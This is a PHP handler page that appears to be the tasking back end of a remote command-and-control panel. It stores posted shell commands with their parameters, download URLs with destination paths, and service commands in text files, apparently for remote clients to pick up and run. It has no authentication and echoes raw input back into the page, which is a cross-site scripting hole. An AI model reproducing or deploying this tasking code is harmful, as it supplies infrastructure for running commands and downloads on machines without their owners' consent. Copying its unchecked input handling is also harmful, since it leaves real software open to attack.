<html>
<head>
<title>Handler</title>
<link rel="stylesheet" href="css/main.css" />
</head>
<body>
<a href="index.php">Back to main menu</a><br />
<hr />
<?php
define("_file_cmd_cmd", "files/cmd_cmd.txt");
define("_file_cmd_param", "files/cmd_param.txt");
define("_file_cmd_display", "files/cmd_display.txt");

define("_file_download_url", "files/download_url.txt");
define("_file_download_dest", "files/download_dest.txt");

define("_file_service_cmd", "files/service_cmd.txt");
if(isset($_POST['_type'])) {
	$_type = $_POST['_type'];
	if($_type == "service") {
		$service_cmd = $_POST['service_cmd'];
		file_put_contents(_file_service_cmd, $service_cmd);
		echo("&emsp;Written: <br />");
		echo("Command: $service_cmd<br />");
		echo("&emsp;Written (RAW): <br />");
		echo("Service :: $service_cmd<br />");
	}
	if($_type == "cmd") {
		$cmd_cmd = $_POST['cmd_cmd'];
		$cmd_param = $_POST['cmd_param'];
		$cmd_display = $_POST['cmd_display'];
		file_put_contents(_file_cmd_cmd, $cmd_cmd);
		file_put_contents(_file_cmd_param, $cmd_param);
		file_put_contents(_file_cmd_display, $cmd_display);
		echo("&emsp;Written: <br />");
		echo("Command: $cmd_cmd<br />");
		echo("Params: $cmd_param<br />");
		echo("Display: $cmd_display<br />");
		echo("&emsp;Written (RAW): <br />");
		echo("$cmd_cmd :: $cmd_param :: $cmd_display<br />");
	}
	if($_type == "download") {
		$download_url = $_POST['download_url'];
		$download_dest = $_POST['download_dest'];
		file_put_contents(_file_download_url, $download_url);
		file_put_contents(_file_download_dest, $download_dest);
		echo("&emsp;Written: <br />");
		echo("Download source: $download_url<br />");
		echo("Download destination: $download_dest<br />");
		echo("&emsp;Written (RAW): <br />");
		echo("$download_url :: $download_dest<br />");
	}
}
?>
</body>
</html>
